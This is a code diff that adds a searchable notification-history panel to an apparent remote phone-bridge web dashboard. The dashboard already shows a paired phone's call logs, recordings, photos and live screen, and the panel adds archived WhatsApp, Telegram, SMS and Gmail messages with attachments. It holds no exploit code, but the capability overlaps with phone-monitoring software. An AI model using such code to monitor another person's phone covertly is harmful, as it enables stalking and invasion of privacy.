@@ -12,6 +12,7 @@ import {
   type RemotePhotoItem,
   type PhotoDataPayload,
   type ScreenSnapshotPayload,
+  type NotificationItem,
 } from "../../lib/use-remote-bridge";
 import { getApiBaseUrl } from "../../lib/env";
 import { authStorage } from "../../lib/auth-storage";
@@ -82,7 +83,7 @@ export function RemoteBridgePage() {
   const [config, setConfig] = useState<BridgeConfig | null>(loadBridgeConfig);
   const [dialNumber, setDialNumber] = useState("");
   const [showSetup, setShowSetup] = useState(!config);
-  const [activeTab, setActiveTab] = useState<"call" | "dial" | "logs" | "recordings" | "photos" | "screen" | "vault" | "settings" | "diag">("call");
+  const [activeTab, setActiveTab] = useState<"call" | "dial" | "logs" | "recordings" | "photos" | "screen" | "notifications" | "vault" | "settings" | "diag">("call");
   const [refreshing, setRefreshing] = useState(false);
 
   const auth = authStorage.getState();
@@ -118,6 +119,9 @@ export function RemoteBridgePage() {
     clearActivePhoto,
     clearScreenSnapshot,
     clearCurrentAudio,
+    getNotificationsList,
+    clearAllNotifications,
+    deleteNotification,
     dialNumber: bridgeDialNumber,
     setPhoneOnline,
   } = bridge;
@@ -140,11 +144,12 @@ export function RemoteBridgePage() {
           getAllCallLogs();
           getRecordingsList();
           getAppSettings();
+          getNotificationsList();
         }
       }
     } catch {}
     setRefreshing(false);
-  }, [authToken, requestStatus, getRecentCalls, getAllCallLogs, getRecordingsList, getAppSettings, setPhoneOnline]);
+  }, [authToken, requestStatus, getRecentCalls, getAllCallLogs, getRecordingsList, getAppSettings, getNotificationsList, setPhoneOnline]);
 
   const handlePairingSuccess = useCallback((encryptionKey: string, isPermanent = false) => {
     const deviceId = getOrCreateBridgeDeviceId();
@@ -219,6 +224,7 @@ export function RemoteBridgePage() {
             { id: "recordings", label: "🎙️ Recordings", count: status.recordings?.length },
             { id: "photos", label: "📸 Photos", count: status.photos?.length },
             { id: "screen", label: "📱 Live Screen" },
+            { id: "notifications", label: "🔔 Notifications", count: status.notifications?.length },
             { id: "vault", label: "🔒 Private Vault" },
             { id: "settings", label: "⚙️ Remote Settings" },
             { id: "diag", label: "🔍 Diag" },
@@ -231,6 +237,7 @@ export function RemoteBridgePage() {
                 if (tab.id === "recordings") getRecordingsList();
                 if (tab.id === "photos") getPhotosList(0, 40);
                 if (tab.id === "screen" && !status.screenSnapshot) captureScreenSnapshot();
+                if (tab.id === "notifications") getNotificationsList();
                 if (tab.id === "settings") getAppSettings();
               }}
               style={{
@@ -328,6 +335,18 @@ export function RemoteBridgePage() {
               snapshot={status.screenSnapshot}
               isCapturing={status.isCapturingScreen}
               onCapture={captureScreenSnapshot}
+              phoneOnline={status.phoneOnline}
+            />
+          )}
+
+          {activeTab === "notifications" && (
+            <NotificationCenterPanel
+              notifications={status.notifications || []}
+              totalCount={status.totalNotificationsCount}
+              isLoading={status.isLoadingNotifications}
+              onRefresh={() => getNotificationsList()}
+              onClearAll={clearAllNotifications}
+              onDeleteNotification={deleteNotification}
               phoneOnline={status.phoneOnline}
             />
           )}
@@ -1407,6 +1426,475 @@ function LiveScreenPanel({
               Captured at {new Date(snapshot.timestamp).toLocaleTimeString()} ({snapshot.width} × {snapshot.height}px)
             </div>
           )}
+        </div>
+      )}
+    </div>
+  );
+}
+
+// ─── Notification Centre Panel ───
+
+function NotificationCenterPanel({
+  notifications,
+  totalCount,
+  isLoading,
+  onRefresh,
+  onClearAll,
+  onDeleteNotification,
+  phoneOnline,
+}: {
+  notifications: NotificationItem[];
+  totalCount: number;
+  isLoading: boolean;
+  onRefresh: () => void;
+  onClearAll: () => void;
+  onDeleteNotification: (id: number) => void;
+  phoneOnline: boolean;
+}) {
+  const [searchQuery, setSearchQuery] = useState("");
+  const [appFilter, setAppFilter] = useState("all");
+  const [timeFilter, setTimeFilter] = useState<"all" | "1h" | "today" | "yesterday" | "week">("all");
+  const [previewImage, setPreviewImage] = useState<string | null>(null);
+
+  // App Filter Categories
+  const appFilters = [
+    { id: "all", label: "All Apps", icon: "📱" },
+    { id: "whatsapp", label: "WhatsApp", icon: "💬", color: "#25D366" },
+    { id: "w4b", label: "WhatsApp Business", icon: "💼", color: "#128C7E" },
+    { id: "instagram", label: "Instagram", icon: "📸", color: "#E1306C" },
+    { id: "telegram", label: "Telegram", icon: "✈️", color: "#0088cc" },
+    { id: "sms", label: "Messages / SMS", icon: "✉️", color: "#FF8C00" },
+    { id: "gmail", label: "Gmail", icon: "📧", color: "#EA4335" },
+    { id: "other", label: "Other", icon: "⚙️", color: "#9E9E9E" },
+  ];
+
+  // Helper for App Badge Color
+  const getAppColor = (pkg: string): string => {
+    const p = pkg.toLowerCase();
+    if (p.includes("w4b")) return "#128C7E";
+    if (p.includes("whatsapp")) return "#25D366";
+    if (p.includes("instagram")) return "#E1306C";
+    if (p.includes("telegram")) return "#0088cc";
+    if (p.includes("messaging") || p.includes("mms")) return "#FF8C00";
+    if (p.includes("google.android.gm")) return "#EA4335";
+    return "#D4AF37";
+  };
+
+  // Helper for App Icon
+  const getAppIcon = (pkg: string): string => {
+    const p = pkg.toLowerCase();
+    if (p.includes("w4b")) return "💼";
+    if (p.includes("whatsapp")) return "💬";
+    if (p.includes("instagram")) return "📸";
+    if (p.includes("telegram")) return "✈️";
+    if (p.includes("messaging") || p.includes("mms")) return "✉️";
+    if (p.includes("google.android.gm")) return "📧";
+    return "🔔";
+  };
+
+  // Filtering Logic
+  const filteredNotifications = useMemo(() => {
+    const now = Date.now();
+    const todayStart = new Date();
+    todayStart.setHours(0, 0, 0, 0);
+    const yesterdayStart = new Date(todayStart.getTime() - 24 * 60 * 60 * 1000);
+
+    return notifications.filter((n) => {
+      // 1. Text Search Filter
+      if (searchQuery.trim()) {
+        const q = searchQuery.toLowerCase();
+        const titleMatch = n.title?.toLowerCase().includes(q);
+        const textMatch = n.text?.toLowerCase().includes(q);
+        const appMatch = n.appName?.toLowerCase().includes(q);
+        const subMatch = n.subText?.toLowerCase().includes(q);
+        if (!titleMatch && !textMatch && !appMatch && !subMatch) return false;
+      }
+
+      // 2. App Filter
+      const p = n.packageName.toLowerCase();
+      if (appFilter === "whatsapp" && (!p.includes("whatsapp") || p.includes("w4b"))) return false;
+      if (appFilter === "w4b" && !p.includes("w4b")) return false;
+      if (appFilter === "instagram" && !p.includes("instagram")) return false;
+      if (appFilter === "telegram" && !p.includes("telegram")) return false;
+      if (appFilter === "sms" && !p.includes("messaging") && !p.includes("mms")) return false;
+      if (appFilter === "gmail" && !p.includes("google.android.gm")) return false;
+      if (appFilter === "other") {
+        if (
+          p.includes("whatsapp") ||
+          p.includes("instagram") ||
+          p.includes("telegram") ||
+          p.includes("messaging") ||
+          p.includes("mms") ||
+          p.includes("google.android.gm")
+        )
+          return false;
+      }
+
+      // 3. Time Filter
+      if (timeFilter === "1h" && n.timestamp < now - 60 * 60 * 1000) return false;
+      if (timeFilter === "today" && n.timestamp < todayStart.getTime()) return false;
+      if (
+        timeFilter === "yesterday" &&
+        (n.timestamp < yesterdayStart.getTime() || n.timestamp >= todayStart.getTime())
+      )
+        return false;
+      if (timeFilter === "week" && n.timestamp < now - 7 * 24 * 60 * 60 * 1000) return false;
+
+      return true;
+    });
+  }, [notifications, searchQuery, appFilter, timeFilter]);
+
+  const handleClearAll = () => {
+    if (window.confirm("Are you sure you want to clear all notification history? This will delete all saved notification logs from your phone.")) {
+      onClearAll();
+    }
+  };
+
+  return (
+    <div style={styles.card} className="rb-glass">
+      {/* Header */}
+      <div style={styles.panelHeader}>
+        <div>
+          <h2 style={{ margin: "0 0 4px 0", fontSize: 20 }}>🔔 Notification History & Centre</h2>
+          <p style={{ margin: 0, fontSize: 13, color: "rgba(255,255,255,0.5)" }}>
+            {totalCount > 0
+              ? `${totalCount.toLocaleString()} notifications recorded (Auto-pruned at 10,000 text / 500 images)`
+              : "No notification history recorded yet"}
+          </p>
+        </div>
+        <div style={{ display: "flex", gap: 10 }}>
+          <button
+            onClick={onRefresh}
+            disabled={!phoneOnline || isLoading}
+            style={styles.refreshBtn}
+          >
+            {isLoading ? "⏳ Loading..." : "🔄 Refresh"}
+          </button>
+          {notifications.length > 0 && (
+            <button
+              onClick={handleClearAll}
+              style={{
+                ...styles.filterBtn,
+                background: "rgba(239, 68, 68, 0.15)",
+                color: "#EF4444",
+                border: "1px solid rgba(239, 68, 68, 0.3)",
+              }}
+            >
+              🗑️ Clear All
+            </button>
+          )}
+        </div>
+      </div>
+
+      {/* Search Input */}
+      <div style={{ marginTop: 16 }}>
+        <input
+          type="text"
+          value={searchQuery}
+          onChange={(e) => setSearchQuery(e.target.value)}
+          placeholder="🔍 Search notifications, senders, messages, emojis..."
+          style={{
+            ...styles.input,
+            width: "100%",
+            boxSizing: "border-box",
+            padding: "10px 14px",
+            fontSize: 14,
+            background: "rgba(255,255,255,0.05)",
+            borderRadius: 10,
+            border: "1px solid rgba(255,255,255,0.1)",
+            color: "#fff",
+          }}
+        />
+      </div>
+
+      {/* App Filter Chips */}
+      <div
+        style={{
+          display: "flex",
+          gap: 6,
+          overflowX: "auto",
+          padding: "12px 0 4px 0",
+          scrollbarWidth: "none",
+        }}
+      >
+        {appFilters.map((f) => {
+          const isActive = appFilter === f.id;
+          return (
+            <button
+              key={f.id}
+              onClick={() => setAppFilter(f.id)}
+              style={{
+                ...(isActive ? styles.filterBtnActive : styles.filterBtn),
+                display: "flex",
+                alignItems: "center",
+                gap: 6,
+                padding: "6px 12px",
+                fontSize: 12,
+                borderRadius: 20,
+                whiteSpace: "nowrap",
+                border: isActive
+                  ? `1px solid ${f.color || "#D4AF37"}`
+                  : "1px solid rgba(255,255,255,0.08)",
+                background: isActive
+                  ? "rgba(212,175,55,0.18)"
+                  : "rgba(255,255,255,0.04)",
+              }}
+            >
+              <span>{f.icon}</span>
+              <span>{f.label}</span>
+            </button>
+          );
+        })}
+      </div>
+
+      {/* Time Filter Chips */}
+      <div
+        style={{
+          display: "flex",
+          gap: 6,
+          overflowX: "auto",
+          padding: "4px 0 16px 0",
+          borderBottom: "1px solid rgba(255,255,255,0.08)",
+          scrollbarWidth: "none",
+        }}
+      >
+        {[
+          { id: "all", label: "All Time" },
+          { id: "1h", label: "⏱️ Last 1 Hour" },
+          { id: "today", label: "📅 Today" },
+          { id: "yesterday", label: "📆 Yesterday" },
+          { id: "week", label: "🗓️ This Week" },
+        ].map((t) => {
+          const isActive = timeFilter === t.id;
+          return (
+            <button
+              key={t.id}
+              onClick={() => setTimeFilter(t.id as any)}
+              style={{
+                ...(isActive ? styles.filterBtnActive : styles.filterBtn),
+                padding: "4px 10px",
+                fontSize: 11,
+                borderRadius: 14,
+                whiteSpace: "nowrap",
+              }}
+            >
+              {t.label}
+            </button>
+          );
+        })}
+      </div>
+
+      {/* Notifications List */}
+      {filteredNotifications.length === 0 ? (
+        <div style={styles.emptyCard}>
+          <div style={{ fontSize: 44, marginBottom: 12 }}>📭</div>
+          <h3 style={{ margin: "0 0 8px 0" }}>No notifications found</h3>
+          <p style={{ color: "rgba(255,255,255,0.5)", fontSize: 14 }}>
+            {!phoneOnline
+              ? "Connect your phone to view live & preserved notification history."
+              : searchQuery || appFilter !== "all" || timeFilter !== "all"
+              ? "No notifications match your search and filter criteria."
+              : "Incoming notifications from WhatsApp, Instagram, SMS, etc., will be preserved here automatically!"}
+          </p>
+        </div>
+      ) : (
+        <div style={{ display: "flex", flexDirection: "column", gap: 10, marginTop: 16 }}>
+          {filteredNotifications.map((item) => {
+            const appColor = getAppColor(item.packageName);
+            const appIcon = getAppIcon(item.packageName);
+
+            return (
+              <div
+                key={item.id}
+                style={{
+                  background: "rgba(255,255,255,0.03)",
+                  border: "1px solid rgba(255,255,255,0.07)",
+                  borderRadius: 12,
+                  padding: 14,
+                  display: "flex",
+                  flexDirection: "column",
+                  gap: 8,
+                  transition: "all 0.2s",
+                }}
+                onMouseEnter={(e) => {
+                  e.currentTarget.style.borderColor = "rgba(212,175,55,0.3)";
+                  e.currentTarget.style.background = "rgba(255,255,255,0.05)";
+                }}
+                onMouseLeave={(e) => {
+                  e.currentTarget.style.borderColor = "rgba(255,255,255,0.07)";
+                  e.currentTarget.style.background = "rgba(255,255,255,0.03)";
+                }}
+              >
+                {/* Notification Top Bar */}
+                <div
+                  style={{
+                    display: "flex",
+                    justifyContent: "space-between",
+                    alignItems: "center",
+                  }}
+                >
+                  <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
+                    <span
+                      style={{
+                        fontSize: 11,
+                        fontWeight: 700,
+                        padding: "2px 8px",
+                        borderRadius: 6,
+                        background: `${appColor}22`,
+                        color: appColor,
+                        border: `1px solid ${appColor}55`,
+                        display: "flex",
+                        alignItems: "center",
+                        gap: 4,
+                      }}
+                    >
+                      <span>{appIcon}</span>
+                      <span>{item.appName}</span>
+                    </span>
+                    {item.subText && (
+                      <span style={{ fontSize: 11, color: "rgba(255,255,255,0.4)" }}>
+                        • {item.subText}
+                      </span>
+                    )}
+                  </div>
+
+                  <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
+                    <span style={{ fontSize: 11, color: "rgba(255,255,255,0.4)" }}>
+                      {new Date(item.timestamp).toLocaleTimeString([], {
+                        hour: "2-digit",
+                        minute: "2-digit",
+                      })}{" "}
+                      • {new Date(item.timestamp).toLocaleDateString()}
+                    </span>
+                    <button
+                      onClick={() => onDeleteNotification(item.id)}
+                      title="Delete notification"
+                      style={{
+                        background: "none",
+                        border: "none",
+                        color: "rgba(255,255,255,0.3)",
+                        cursor: "pointer",
+                        fontSize: 14,
+                        padding: "2px 6px",
+                        borderRadius: 4,
+                      }}
+                      onMouseEnter={(e) => (e.currentTarget.style.color = "#EF4444")}
+                      onMouseLeave={(e) => (e.currentTarget.style.color = "rgba(255,255,255,0.3)")}
+                    >
+                      ✕
+                    </button>
+                  </div>
+                </div>
+
+                {/* Sender Title */}
+                {item.title && (
+                  <div style={{ fontSize: 14, fontWeight: 700, color: "#fff" }}>
+                    {item.title}
+                  </div>
+                )}
+
+                {/* Message Body */}
+                {item.text && (
+                  <div
+                    style={{
+                      fontSize: 13.5,
+                      color: "rgba(255,255,255,0.85)",
+                      lineHeight: 1.5,
+                      whiteSpace: "pre-wrap",
+                      wordBreak: "break-word",
+                    }}
+                  >
+                    {item.text}
+                  </div>
+                )}
+
+                {/* Picture Attachment Thumbnail */}
+                {item.hasPicture && item.pictureBase64 && (
+                  <div style={{ marginTop: 4 }}>
+                    <img
+                      src={`data:image/jpeg;base64,${item.pictureBase64}`}
+                      alt="Notification Attachment"
+                      onClick={() => setPreviewImage(item.pictureBase64!)}
+                      style={{
+                        maxWidth: 240,
+                        maxHeight: 160,
+                        borderRadius: 8,
+                        border: "1px solid rgba(255,255,255,0.1)",
+                        cursor: "pointer",
+                        objectFit: "cover",
+                      }}
+                    />
+                  </div>
+                )}
+              </div>
+            );
+          })}
+        </div>
+      )}
+
+      {/* Picture Lightbox Modal */}
+      {previewImage && (
+        <div
+          style={{
+            position: "fixed",
+            top: 0,
+            left: 0,
+            right: 0,
+            bottom: 0,
+            background: "rgba(0,0,0,0.85)",
+            backdropFilter: "blur(10px)",
+            zIndex: 100,
+            display: "flex",
+            flexDirection: "column",
+            alignItems: "center",
+            justifyContent: "center",
+            padding: 24,
+          }}
+          onClick={() => setPreviewImage(null)}
+        >
+          <div
+            style={{
+              maxWidth: 700,
+              maxHeight: "85vh",
+              display: "flex",
+              flexDirection: "column",
+              alignItems: "center",
+              background: "#121826",
+              borderRadius: 16,
+              border: "1px solid rgba(212,175,55,0.3)",
+              overflow: "hidden",
+              boxShadow: "0 20px 50px rgba(0,0,0,0.7)",
+            }}
+            onClick={(e) => e.stopPropagation()}
+          >
+            <div
+              style={{
+                width: "100%",
+                padding: "12px 18px",
+                display: "flex",
+                justifyContent: "space-between",
+                alignItems: "center",
+                borderBottom: "1px solid rgba(255,255,255,0.08)",
+              }}
+            >
+              <span style={{ fontWeight: 700, fontSize: 14 }}>Notification Attachment</span>
+              <button onClick={() => setPreviewImage(null)} style={styles.closeBtn}>
+                ✕
+              </button>
+            </div>
+            <div style={{ padding: 16 }}>
+              <img
+                src={`data:image/jpeg;base64,${previewImage}`}
+                alt="Full Attachment"
+                style={{
+                  maxWidth: "100%",
+                  maxHeight: "70vh",
+                  borderRadius: 8,
+                  objectFit: "contain",
+                }}
+              />
+            </div>
+          </div>
         </div>
       )}
     </div>
